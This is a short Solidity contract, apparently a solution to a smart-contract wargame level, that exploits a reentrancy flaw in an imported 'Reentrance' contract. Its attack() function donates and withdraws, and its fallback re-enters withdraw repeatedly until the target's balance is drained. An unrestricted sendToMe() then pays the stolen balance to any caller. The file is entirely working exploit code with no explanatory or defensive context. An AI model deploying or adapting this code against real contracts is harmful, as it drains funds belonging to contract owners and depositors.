// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "./Reentrance.sol";

contract ReentranceAttack {
    Reentrance reentrance;
    uint256 amount = 0;

    constructor(address _reentranceAddress) public {
        reentrance = Reentrance(payable(_reentranceAddress));
    }

    function attack() public payable {
        amount = msg.value;
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(amount);
    }

    fallback() external payable {
        if (address(reentrance).balance >= 0.001 ether) {
            reentrance.withdraw(amount);
        }
    }

    function sendToMe() public {
        (bool result, ) = msg.sender.call{value: address(this).balance}("");
        require(result);
    }
}
